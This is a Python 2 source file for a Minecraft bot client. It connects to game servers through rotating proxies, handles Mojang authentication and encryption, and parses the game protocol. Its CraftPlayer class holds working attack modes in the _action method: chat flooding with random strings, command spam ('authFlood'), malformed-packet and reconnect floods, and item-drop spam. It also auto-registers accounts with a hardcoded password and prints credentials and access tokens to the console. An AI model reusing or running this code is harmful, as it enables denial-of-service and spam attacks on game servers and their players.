from SyncPrint import *
mchars = 'abcdefghilmnopqrstuvwxyzABCDEFGHILMNOPQRSTUVWXYZ123456789!\\/'
import socks, urllib2, struct, threading, time, binascii, hashlib, re, sys, random, string, ProxyManager, socket, io
import requests
from simplejson import dumps as json_dumps
from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Cipher import AES
from uuid import UUID
def dummy(x, y):
    pass


ids = [46,
 49,
 7,
 57,
 322]

def _pkcs1_unpad(bytes):
    pos = bytes.find('\x00')
    if pos > 0:
        return bytes[pos+1:]

def _pkcs1_pad(bytes):
    assert len(bytes) < 117
    padding = ""
    while len(padding) < 125-len(bytes):
        byte = Random.get_random_bytes(1)
        if byte != '\x00':
            padding += byte
    return '\x00\x02%s\x00%s' % (padding, bytes)

def generate_key_pair():
    """Generates a 1024 bit RSA key pair"""
    return RSA.generate(1024)

def encode_public_key(key):
    """Encodes a public RSA key in ASN.1 format as defined by x.509"""
    return key.publickey().exportKey(format="DER")

def generate_random_bytes(length):
    return Random.get_random_bytes(length)

def generate_challenge_token():
    """Generates 4 random bytes"""
    return generate_random_bytes(4)

def generate_server_id():
    """Generates 20 random hex characters"""
    return "".join("%02x" % ord(c) for c in generate_random_bytes(10))

def decrypt_with_private_key(data, private_key):
    """Decrypts the PKCS#1 padded shared secret using the private RSA key"""
    return _pkcs1_unpad(private_key.decrypt(data))

def generated_cipher(shared_secret):
    """Creates a AES128 stream cipher using cfb8 mode"""
    return AES.new(shared_secret, AES.MODE_CFB, shared_secret)

def decode_public_key(bytes):
    """Decodes a public RSA key in ASN.1 format as defined by x.509"""
    return RSA.importKey(bytes)

def generate_shared_secret():
    """Generates a 128 bit secret key to be used in symmetric encryption"""
    return generate_random_bytes(16)

def encrypt_with_public_key(data, public_key):
    """Encrypts the PKCS#1 padded shared secret using the public RSA key"""
    return public_key.encrypt(_pkcs1_pad(data), 0)[0]

def make_server_hash(server_id, shared_secret, key):
    digest = hashlib.sha1()
    digest.update(server_id)
    digest.update(shared_secret)
    digest.update(encode_public_key(key))
    d = long(digest.hexdigest(), 16)
    if d >> 39 * 4 & 0x8:
        return "-%x" % ((-d) & (2 ** (40 * 4) - 1))
    return "%x" % d

def join_server(session, server_hash):
    r = requests.post('https://sessionserver.mojang.com/session/minecraft/join', data=json_dumps({
        'accessToken': session.access_token,
        'selectedProfile': session.uuid_hex,
        'serverId': server_hash,
    }), headers = {
        'Content-Type': 'application/json', #; charset=utf-8',
        'User-Agent': None,
    })
    return r.status_code in (200, 204)

def check_player(player_ign, server_hash):
    r = requests.get('https://sessionserver.mojang.com/session/minecraft/hasJoined?username=%s&serverId=%s' % (
        player_ign, server_hash))
    return None if r.status_code != 200 else r.json()

class Session(object):
    YGGDRASIL_BASE = "https://authserver.mojang.com"

    @classmethod
    def make_client_token(cls):
        return "".join("%02x" % ord(c) for c in generate_random_bytes(16))

    @classmethod
    def from_credentials(cls, username, password, client_token=None):
        if client_token is None:
            client_token = cls.make_client_token()
        info = cls.do_request("/authenticate", {
            'agent': {
                'name': 'Minecraft',
                'version': 1,
            },
            'username': username,
            'password': password,
            'clientToken': client_token,
        })

        print info
        print info['accessToken']
        return cls(
            info['accessToken'],
            info['selectedProfile']['name'],
            info['selectedProfile']['id']
        )

    @classmethod
    def from_access_token(cls, access_token):
        info = cls.do_request("/refresh", {
            'accessToken': access_token
        })

        return cls(
            info['accessToken'],
            info['selectedProfile']['name'],
            info['selectedProfile']['id']
        )

    @classmethod
    def from_authinfo(cls, access_token, player_ign, player_uuid):
        return cls(
            access_token,
            player_ign,
            player_uuid,
        )

    def __init__(self, access_token, player_ign, uuid):
        self._access_token = access_token
        self._player_ign = player_ign
        self._uuid = UUID(uuid)

    def refresh(self):
        return Session(self._access_token)

    @property
    def player_ign(self):
        return self._player_ign

    @property
    def uuid(self):
        return str(self._uuid)

    @property
    def uuid_hex(self):
        return self._uuid.hex

    @property
    def access_token(self):
        return self._access_token

    @property
    def session_id(self):
        return 'token:%s:%s' % (self._access_token, self.uuid_hex)

    def __str__(self):
        return "<Session: %s (%s) (accessToken: %s)>" % (
            self._player_ign, self._uuid, self._access_token)

    def validate(self):
        r = requests.post(self.YGGDRASIL_BASE + "/validate", data=json_dumps({
            'accessToken': self._access_token
        }))
        return r.status_code in (200, 204)

    def invalidate(self):
        r = requests.post(self.YGGDRASIL_BASE + "/invalidate", data=json_dumps({
            'accessToken': self._access_token
        }))
        return r.status_code in (200, 204)

    @classmethod
    def do_request(cls, endpoint, data):
        try:
            r = requests.post(cls.YGGDRASIL_BASE + endpoint, data=json_dumps(data))
            if not r.ok:
                try:
                    error = r.json()['errorMessage']
                except:
                    error = "unknown error"
                raise SessionException("%d: %s" % (r.status_code, error))
            json = r.json()
            return json
        except Exception as e:
            print str(e)

def encode_varint(value):
    """Encodes a single Python integer to a VARINT."""
    return "".join(encode_varint_stream([value]))

def decode_varint(value):
    """Decodes a single Python integer from a VARINT.

    Note that `value` may be a stream containing more than a single
    encoded VARINT. Only the first VARINT will be decoded and returned. If
    you expect to be handling multiple VARINTs in a stream you might want to
    use the `decode_varint_stream` function directly.

    """
    return decode_varint_stream(value).next()


def encode_varint_stream(values):
    """Lazily encodes an iterable of Python integers to a VARINT stream."""
    for value in values:
        while True:
            if value > 127:
                # Yield a byte with the most-significant-bit (MSB) set plus 7
                # bits of data from the value.
                yield chr((1 << 7) | (value & 0x7f))

                # Shift to the right 7 bits to drop the data we've already
                # encoded. If we've encoded all the data for this value, set the
                # None flag.
                value >>=  7
            else:
                # This is either the last byte or only byte for the value, so
                # we don't set the MSB.
                yield chr(value)
                break


def decode_varint_stream(stream):
    """Lazily decodes a stream of VARINTs to Python integers."""
    value = 0
    base = 1
    for raw_byte in stream:
        val_byte = ord(raw_byte)
        value += (val_byte & 0x7f) * base
        if (val_byte & 0x80):
            # The MSB was set; increase the base and iterate again, continuing
            # to calculate the value.
            base *= 128
        else:
            # The MSB was not set; this was the last byte in the value.
            yield value
            value = 0
            base = 1


def CraftString(text):
    return encode_varint(len(text))+text.encode('utf_8')
    #return CraftStringMed(text)
    #return struct.pack('>h', len(text)) + text.encode('utf_16_be')


def CraftStringMed(text):
    return struct.pack('>h', len(text)) + '\x00' + '\x00'.join(list(text))

def sr(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def CraftStringOld(text):
    msg = '\x00' + '\x00'.join(list(text))
    return chr(len(text)) + msg

class CraftPlayer:
    _AES = None
    _session = None
    _printChat = False
    _nickname = ''
    _password = ''
    _proxy = ''
    _sessionId = ''
    _loggedIn = False
    _server = ''
    _coordX = 0
    _coordY = 0
    _coordZ = 0
    _sdebug = False
    _attacks = False
    _prependFlood = False
    _packet_len = -1;
    _threshold = -1;
    _packet = None;
    _old_packet_id = 0
    def SendPacket(self, pBuffer):
        self._sendBytes(str(encode_varint(len(pBuffer))) + str(pBuffer))

    def _action(self):
        try:
            self.SendPacket('\x01' + CraftString(self._queuedMessages.pop(0)))
        except:
            pass

        try:
            if self._connreconn:
                self._socket.close()
                self._connreconn = False
            for x in self._attacks:
                if x == 'sM':
                    self._attacks.remove('sM')
                    prepend = self._prependFlood
                    msg = self._msg
                    if msg == '':
                        self.SendPacket('\x01' + CraftString(prepend + ''.join((random.choice(mchars) for x in range(random.randint(8, 90 - len(prepend)))))))
                    else:
                        self.SendPacket('\x01' + CraftString(msg))
                if x == 'chatFlood':
                    prepend = self._prependFlood
                    msg = self._msg
                    if msg == '':
                        self.SendPacket('\x01' + CraftString(prepend + ''.join((random.choice(mchars) for x in range(random.randint(8, 90 - len(prepend)))))))
                    else:
                        self.SendPacket('\x01' + CraftString(msg))
                if x == 'creativeDrop':
                    self.SendPacket('k\xff\xff' + struct.pack('>h', random.choice(ids)) + '@\x00\x00')
                if x == 'tO':
                    print 'timeouting!'
                    time.sleep(29)
                if x == 'pFlood':
                    x = 0
                    self._socket.sendall('\x01' + CraftString('aaaaaaaaaaaaaaa;' + 'a' * 50))
                    self._socket.close()
                if x == 'reconnectFlood':
                    self._socket.close()
                    self._log('Reconnecting...')
                if x == 'authFlood':
                    self.SendPacket('\x01' + CraftString("/f create asdasidijasdijoaiosdjio"))
                    self.SendPacket('\x01' + CraftString("/f create asdasidijasdijoaiosdjio"))

        except:
            pass

    def __init__(self, nick, password = '', proxy = '', server = '', hostx = '', portx = '', isOffline = False, printchat = False, debug = False, attacks = [], prependFlood = '', msg = '', count = 5, callback = dummy, eventHook = None):
        self._queuedMessages = list()
        self._kre = False
        self._eHook = eventHook
        self._connreconn = False
        self._msg = msg
        self._count = count
        self._nickname = nick
        self._password = password
        self._printChat = printchat
        self._server = server
        self._isOffline = isOffline
        self._hostx = hostx
        self._portx = portx
        if proxy != None:
            self._proxy = ProxyManager.getProxy()
        self._loggedIn = False
        self._sdebug = debug
        self._attacks = attacks
        self._prependFlood = prependFlood
        self._callback = callback
        self._isConnected = False
        return

    def _connect(self):
        try:
            self._socket.close()
        except:
            pass

        if self._password != "":
            print self._password
            self._session = Session.from_credentials(self._nickname, self._password)
            print self._password
        self._socket = socks.socksocket()
        self._socket.settimeout(5)
        try:
            self._proxtype = self._proxy.split('|')[0]
            self._proxport = self._proxy.split(':')[1]
            self._proxserver = self._proxy.split(':')[0].split('|')[1]
            self._socket.setproxy(eval("socks.PROXY_TYPE_" + self._proxtype), self._proxserver, int(self._proxport))
            #self._socket.setproxy(None, self._proxserver, int(self._proxport))
        except:
            ProxyManager.badProxy(self._proxy)
        try:
            _serverip=self._server[0]
            _serverport = self._server[1]
            self._socket.connect((_serverip, _serverport))
            self.SendPacket('\x00' + encode_varint(210) + CraftString(_serverip) + struct.pack('>h', _serverport)+encode_varint(2))
            self.SendPacket('\x00' + CraftString(self._nickname))
        except:
            ProxyManager.badProxy(self._proxy)
            return
        try:
            self._socket.settimeout(35)
            kz = self._startLoop()
            if kz == 'KE':
                self._callback('KE', self)
        except Exception as e:
            print str(e)
            if self._sdebug:
                raise
            return
    def _startLoop(self):
        return self._runLoop()


    def _log(self, text):
        pr = self._proxy.split('|')
        if self._proxy == None:
            pr = ('None', '')
        syncprint('[{:6}|{:20}] - [{:20}] - {:}'.format(pr[0], pr[1], self._nickname, text))
        return

    def _debug(self, text):
        if self._sdebug:
            self._log(text)

    def _sendBytes(self, _data):
        if self._AES == None:
            self._socket.sendall(_data)
        else:
            self._socket.sendall(self._AES.encrypt(_data))

    def _SendEncrypt(self, _shared, _token):
        len1 = encode_varint(len(_shared))
        len2 = encode_varint(len(_token))
        self.SendPacket("\x01"+str(len1)+_shared+str(len2)+_token)

    def _getBytes(self, _sz=1):
        data = ''
        osz = _sz
        if self._packet==None:
            if self._AES!=None:
                while _sz != 0:
                        data += self._AES.decrypt(self._socket.recv(_sz))
                        _sz = osz - len(data)
            else:
                    while _sz != 0:
                        data += self._socket.recv(_sz)
                        _sz = osz - len(data)
        else:
            while _sz != 0:
                data += self._packet.read(_sz)
                _sz = osz - len(data)
        return data

    def _getPacket(self):
        data = ''
        sz = self._packet_len
        if self._AES!=None:
            while sz != 0:
                data += self._AES.decrypt(self._socket.recv(sz))
                sz = self._packet_len - len(data)
        else:
            while sz != 0:
                data += self._socket.recv(sz)
                sz = self._packet_len - len(data)
        return data

    def _read_short(self):
        return struct.unpack(">h", self._getBytes(2))[0]

    def _read_short_array(self):
        size = self._read_short()
        return self._getBytes(size)

    def _readVarint(self):
        value = 0
        base = 1
        while 1:
            val_byte = ord(self._getBytes(1))
            value += (val_byte & 0x7f) * base
            if (val_byte & 0x80):
                print "base"
                base *= 128
            else:
                print value
                return value

    def _readString(self):
        lent = self._readVarint()
        try:
            retn = self._getBytes(lent)
        except:
            return ''
        return ''.join(retn)

    def _itemEnchant(self, item):
        value = item
        return 256 <= value and value <= 259 or 267 <= value and value <= 279 or 283 <= value and value <= 286 or 290 <= value and value <= 294 or 298 <= value and value <= 317 or value == 261 or value == 359 or value == 346

    def _readSlot(self):
        item = int(binascii.b2a_hex(self._getBytes(2)), 16)
        if item != 65535:
            count = ord(self._getBytes(1))
            damage = int(binascii.b2a_hex(self._getBytes(2)), 16)
            if self._itemEnchant(item):
                leng = int(binascii.b2a_hex(self._getBytes(2)), 16)
                if leng == 65535:
                    return
                while leng != 0:
                    self._getBytes(1)
                    leng = leng - 1

    def _genMetadata(self):
        metadata = {}
        x = ord(self._getBytes(1))
        while x != 127:
            self._debug(x)
            index = x & 31
            ty = x >> 5
            self._debug("      "+str(ty))
            if ty == 0:
                val = ord(self._getBytes(1))
            if ty == 1:
                val = self._getBytes(2)
            if ty == 2:
                val = self._getBytes(4)
            if ty == 3:
                val = self._getBytes(4)
            if ty == 4:
                val = self._readString()
            if ty == 5:
                self._readSlot()
            if ty == 6:
                val = []
                for i in range(3):
                    val.append(self._getBytes(4))

            metadata[index] = (ty, val)
            x = ord(self._getBytes(1))
        return metadata

    def _runLoop(self):
        while True:
            try:
                self._sdebug =True
                self._packet = None
                self._packet_len = self._readVarint()
                if self._packet_len == None or self._packet_len <= 0:
                    _packet_id = 'ER'
                if self._threshold != -1:
                    print "thresh"
                    data_lenght = self._readVarint()
                    compressed = self._getPacket()
                    if data_lenght==0:
                        self._packet = io.BytesIO(compressed)
                    else:
                        self._packet = io.BytesIO(compressed.decode('zlib'))
                    _packet_id = self._readVarint()
                else:
                    print "packet"
                    tmp_p = self._getPacket()
                    self._packet = io.BytesIO(tmp_p)
                    _packet_id = self._readVarint()
                self._old_packet_id = _packet_id
            except Exception as e:
                print str(e)
                self._log('Disconnected!')
                _packet_id = 'ER'
                return
            if self._isConnected ==False:

                if _packet_id == 0x00:
                    rl = self._readString()
                    self._log('Disconnected! [' + rl + ']')
                    self._isConnected = False
                    try:
                        self._socket.close()
                    except:
                        pass

                    return
                elif _packet_id == 0x01:
                    self._debug('Encryption Request')
                    server_id = self._readString()
                    print server_id
                    shared = self._read_short_array()
                    print shared
                    token = self._read_short_array()
                    print token
                    if shared != '':
                        rsa_key = decode_public_key(shared)
                        print "6"
                        shared_secret = generate_shared_secret()
                        print shared_secret
                        response_token = encrypt_with_public_key(
                            token,
                            rsa_key
                        )
                        print "8"
                        encrypted_shared_secret = encrypt_with_public_key(
                            shared_secret,
                            rsa_key
                        )
                        print "9"
                        server_hash = make_server_hash(
                            server_id,
                            shared_secret,
                            rsa_key,
                        )
                        print "10"
                        join_server(self._session, server_hash)
                        print "11"
                        self._SendEncrypt(encrypted_shared_secret,response_token)
                        print "12"
                        self._AES = generated_cipher(shared_secret)
                        print "13"
                    else:
                        self._SendEncrypt('',token)
                elif _packet_id == 0x02:
                    ProxyManager.coolProxy(self._proxy)
                    self._debug('Login Success')
                    self._log('Connected!')
                    self._debug(self._readString())
                    self._debug(self._readString())
                    self._isConnected = True
                    self.SendPacket('\x15\x05\x65\x6e\x5f\x55\x53\x0c\x00\x01\x02\x01')
                    self.SendPacket('\x13\x17\x08\x4d\x43\x7c\x42\x72\x61\x6e\x64\x00\x07\x76\x61\x6e\x69\x6c\x6c\x61')
                elif _packet_id == 0x03:
                    self._debug('Set Compression')
                    self._threshold = self._readVarint()
            else:
                if self._count == 0:
                    self._action()
                    self._count = 10
                self._count = self._count - 1
                #if self._eHook != None:
                #   if self._eHook(_packet_id, self) == True:
                #      continue
                if _packet_id == 0x00:
                    self._debug('Ping')
                    self.SendPacket(self._readVarint())
                elif _packet_id == 0x01:
                    self._debug('Join Game')
                    self._getBytes(4)
                    self._getBytes(1)
                    self._getBytes(1)
                    self._getBytes(1)
                    self._getBytes(1)
                    self._readString()
                elif _packet_id == 0x02:
                    self._debug('Chat Message')
                    msg = self._readString()
                    if self._printChat == True:
                        self._log('Chat message [' + msg + ']')
                    else:
                        self._debug('Chat message [' + msg + ']')
                    if self._loggedIn == False:
                        if msg.find('login') != -1:
                            self._log('Logging in! [' + msg + ']')
                            self._queuedMessages.append('/login omfg1336')
                            self._loggedIn = True
                        if msg.find('register') != -1:
                            self._log('Registering! [' + msg + ']')
                            self._queuedMessages.append('/register omfg1336 omfg1336')
                            self._queuedMessages.append('/register omfg1336')
                            self._queuedMessages.append('/setpassword omfg1336')
                            self._queuedMessages.append('/login omfg1336')
                            self._loggedIn = True
                            self._log('Done')
                elif _packet_id == 0x03:
                    self._debug('Time Update')
                    self._getBytes(8)
                    self._getBytes(8)
                elif _packet_id == 0x04:
                    self._debug('Entity Equipment')
                    self._getBytes(4)
                    self._getBytes(2)
                    self._readSlot()
                elif _packet_id == 0x05:
                    x = self._getBytes(4)
                    y = self._getBytes(4)
                    z = self._getBytes(4)
                    self._debug('Spawn Position [X:' + str(int(binascii.b2a_hex(x), 16)) + ', Y:' + str(int(binascii.b2a_hex(y), 16)) + ', Z:' + str(int(binascii.b2a_hex(z), 16)) + ']')
                elif _packet_id == 0x06:
                    self._debug('Update Health')
                    self._getBytes(4)
                    self._getBytes(2)
                    self._getBytes(4)
                elif _packet_id == 0x07:
                    self._debug('Respawn')
                    self._getBytes(4)
                    self._getBytes(1)
                    self._getBytes(1)
                    self._debug(self._readString())
                elif _packet_id == 0x08:
                    self._debug('Player Position And Look')
                    self._getBytes(8)
                    self._getBytes(8)
                    self._getBytes(8)
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(1)
                elif _packet_id == 0x09:
                    self._debug('Held Item Change')
                    self._getBytes(1)
                elif _packet_id == 0x0A:
                    self._debug('Use Bed')
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(1)
                    self._getBytes(4)
                elif _packet_id == 0x0B:
                    self._debug('Animation')
                    self._readVarint()
                    self._getBytes(1)
                elif _packet_id == 0x0C:
                    pass
                elif _packet_id == 0x0D:
                    self._debug('Collect Item')
                    self._getBytes(4)
                    self._getBytes(4)
                elif _packet_id == 0x0E:
                    self._debug('Spawn Object')
                    self._readVarint()
                    self._getBytes(1)
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(1)
                    self._getBytes(1)
                    lolz = 'Normal'
                    if self._getBytes(4) != '\x00\x00\x00\x00':
                        lolz = 'Projectile'
                        self._getBytes(2)
                        self._getBytes(2)
                        self._getBytes(2)
                    self._debug('Add Object/Vehicle [' + lolz + ']')
                elif _packet_id == 0x0F:
                    self._debug('Spawn Mob')
                    self._readVarint()
                    self._getBytes(1)
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(1)
                    self._getBytes(1)
                    self._getBytes(1)
                    self._getBytes(2)
                    self._getBytes(2)
                    self._getBytes(2)
                    self._genMetadata()
                elif _packet_id == 0x10:
                    self._readVarint()
                    self._debug('Painting [' + self._readString() + ']')
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(4)
                elif _packet_id == 0x11:
                    self._debug('Spawn Experience Orb')
                    self._readVarint()
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(2)
                elif _packet_id == 0x12:
                    self._debug('Entity Velocity')
                    self._getBytes(4)
                    self._getBytes(2)
                    self._getBytes(2)
                    self._getBytes(2)
                elif _packet_id == 0x13:
                    self._debug('Destroy Entities')
                    leng = int(binascii.b2a_hex(self._getBytes(1)),16)
                    for i in range(leng):
                        self._getBytes(4)
                elif _packet_id == 0x14:
                    self._debug('Entity')
                    self._getBytes(4)
                elif _packet_id == 0x15:
                    self._debug('Entity Relative Move')
                    self._getBytes(4)
                    self._getBytes(1)
                    self._getBytes(1)
                    self._getBytes(1)
                elif _packet_id == 0x16:
                    self._debug('Entity Look')
                    self._getBytes(4)
                    self._getBytes(1)
                    self._getBytes(1)
                elif _packet_id == 0x17:
                    self._debug('Entity Look and Relative Move')
                    self._getBytes(4)
                    self._getBytes(1)
                    self._getBytes(1)
                    self._getBytes(1)
                    self._getBytes(1)
                    self._getBytes(1)
                elif _packet_id == 0x18:
                    self._debug('Entity Teleport')
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(1)
                    self._getBytes(1)
                elif _packet_id == 0x19:
                    self._debug('Entity Head Look')
                    self._getBytes(4)
                    self._getBytes(1)
                elif _packet_id == 0x1A:
                    self._debug('Entity Status')
                    self._getBytes(4)
                    self._getBytes(1)
                elif _packet_id == "\x1B":
                    self._debug('Attach Entity')
                    self._getBytes(4)
                    self._getBytes(4)
                elif _packet_id == 0x1C:
                    self._debug('Entity Metadata')
                    self._getBytes(4)
                    self._genMetadata()
                elif _packet_id == 0x1D:
                    self._debug('Entity Effect')
                    self._getBytes(4)
                    self._getBytes(1)
                    self._getBytes(1)
                    self._getBytes(2)
                elif _packet_id == 0x1E:
                    self._debug('Remove Entity Effect')
                    self._getBytes(4)
                    self._getBytes(1)
                elif _packet_id == 0x1F:
                    self._debug('Set Experience')
                    self._getBytes(4)
                    self._getBytes(2)
                    self._getBytes(2)
                elif _packet_id == 0x20:
                    self._debug('Entity Properties')
                elif _packet_id == 0x21:
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(1)
                    self._getBytes(2)
                    self._getBytes(2)
                    lent = int(binascii.b2a_hex(self._getBytes(4)), 16)
                    self._debug('Chunk Update [' + str(lent) + ']')
                    self._getBytes(lent)
                elif _packet_id == 0x22:
                    self._debug('Multi Block Change')
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(2)
                    lentk = int(binascii.b2a_hex(self._getBytes(4)), 16)
                    self._getBytes(lentk)
                elif _packet_id == 0x23:
                    self._debug('Block Change')
                    pass
                elif _packet_id == 0x24:
                    self._debug('Block Action')
                    self._getBytes(4)
                    self._getBytes(2)
                    self._getBytes(4)
                    self._getBytes(1)
                    self._getBytes(1)
                    self._readVarint()
                elif _packet_id == 0x25:
                    self._debug('Block Break Animation')
                    self._readVarint()
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(1)
                elif _packet_id == 0x26:
                    self._debug('Map Chunk Bulk')
                elif _packet_id == 0x27:
                    self._debug('Explosion')
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(4)
                    lent = int(binascii.b2a_hex(self._getBytes(4)), 16)
                    self._getBytes(lent*3)
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(4)
                elif _packet_id == 0x28:
                    self._debug('Effect')
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(1)
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(1)
                elif _packet_id == 0x29:
                    self._debug('Named Sound Effect')
                    self._readString()
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(1)
                elif _packet_id == 0x2A:
                    self._debug('New/Inval_packet State')
                    self._readString()
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(4)
                elif _packet_id == 0x2B:
                    self._debug('Change Game State')
                    self._getBytes(1)
                    self._getBytes(4)
                elif _packet_id == 0x2C:
                    self._debug('Spawn Global Entity - thunderbolt')
                    self._readVarint()
                    self._getBytes(1)
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(4)
                elif _packet_id == 0x2D:
                    self._getBytes(1)
                    WType = int(binascii.b2a_hex(self._getBytes(1)),16)
                    self._debug('Open window [' + self._readString() + ']')
                    self._getBytes(1)
                    self._getBytes(1)
                    if WType==1:
                        self._getBytes(4)
                elif _packet_id == 0x2E:
                    self._debug('Close Window')
                    self._getBytes(1)
                elif _packet_id == 0x2F:
                    self._getBytes(1)
                    self._getBytes(2)
                    self._debug('Set Slot')
                    self._readSlot()
                elif _packet_id == 0x30:
                    self._getBytes(1)
                    self._debug('Window Items')
                    lens = int(binascii.b2a_hex(self._getBytes(2)), 16)
                    while lens != 0:
                        self._readSlot()
                        lens = lens - 1

                elif _packet_id == 0x31:
                    self._debug('Window Property')
                    self._getBytes(1)
                    self._getBytes(2)
                    self._getBytes(2)
                elif _packet_id == 0x32:
                    self._debug('Confirm Transaction')
                    self._getBytes(1)
                    self._getBytes(2)
                    self._getBytes(1)
                elif _packet_id == 0x33:
                    self._getBytes(4)
                    self._getBytes(2)
                    self._getBytes(4)
                    a = self._readString()
                    b = self._readString()
                    c = self._readString()
                    d = self._readString()
                    self._debug('Update Sign [' + a + ':' + b + ':' + c + ':' + d + ']')
                elif _packet_id == 0x34:
                    self._debug('Maps')
                    self._readVarint()
                    leng = int(binascii.b2a_hex(self._getBytes(2)), 16)
                    self._getBytes(leng)
                elif _packet_id == 0x35:
                    self._debug('Update Block Entity')
                    self._getBytes(4)
                    self._getBytes(2)
                    self._getBytes(4)
                    self._getBytes(1)
                    leng = int(binascii.b2a_hex(self._getBytes(2)), 16)
                    if leng>0:
                        self._getBytes(leng)
                elif _packet_id == 0x36:
                    self._debug('Sign Editor Open')
                    self._getBytes(4)
                    self._getBytes(4)
                    self._getBytes(4)
                elif _packet_id == 0x37:
                    self._debug('Increment Statistic')
                    leng = self._readVarint()
                    for i in range(leng):
                        self._readString()
                        self._readVarint()
                elif _packet_id == 0x38:
                    self._debug('Player List Item [' + self._readString() + ']')
                    self._getBytes(1)
                    self._getBytes(2)
                elif _packet_id == 0x39:
                    self._debug('Player Abilities')
                    self._getBytes(1)
                    self._getBytes(4)
                    self._getBytes(4)
                elif _packet_id == 0x3A:
                    self._debug('Tab-Complete')
                    self._readVarint()
                    self._readString()
                elif _packet_id == 0x3B:
                    self._debug('Scoreboard Objective')
                    self._readString()
                    self._readString()
                    self._getBytes(1)
                elif _packet_id == 0x3C:
                    self._debug('Update Score')
                    self._readString()
                    update = int(binascii.b2a_hex(self._getBytes(1)), 16)
                    if update != 1:
                        self._readString()
                        self._getBytes(4)
                elif _packet_id == 0x3D:
                    self._debug('Display Scoreboard')
                    self._getBytes(1)
                    self._readString()
                elif _packet_id == 0x3E:
                    self._debug('Teams')
                    self._readString()
                    mode = int(binascii.b2a_hex(self._getBytes(1)), 16)
                    if mode == 0:
                        self._readString()
                        self._readString()
                        self._readString()
                        self._getBytes(1)
                        leng = int(binascii.b2a_hex(self._getBytes(2)), 16)
                        self._getBytes(leng)
                    if mode == 2:
                        self._readString()
                        self._readString()
                        self._readString()
                        self._getBytes(1)
                    if mode == 3:
                        leng = int(binascii.b2a_hex(self._getBytes(2)), 16)
                        self._getBytes(leng)
                    if mode == 4:
                        leng = int(binascii.b2a_hex(self._getBytes(2)), 16)
                        self._getBytes(leng)
                elif _packet_id == 0x3F:
                    self._debug('Plugin message [' + self._readString() + ']')
                    sz = int(binascii.b2a_hex(self._getBytes(2)), 16)
                    self._getBytes(sz)
                else:
                    if _packet_id == 0x40:
                        rl = self._readString()
                        self._log('Disconnected! [' + rl + ']')
                        self._isConnected = False
                        try:
                            self._socket.close()
                        except:
                            pass
                        return
                    if _packet_id == '':
                        pass
                    else:
                        if _packet_id == 'ER':
                            if self._isConnected:
                                self._log('Disconnected! [Connection Error]'+ self._old_packet_id)
                            try:
                                if 'pFlood' in self._attacks and self._isConnected:
                                    self._isConnected = False
                                else:
                                    self._socket.close()
                            except:
                                pass

                            self._isConnected = False
                            return
        return
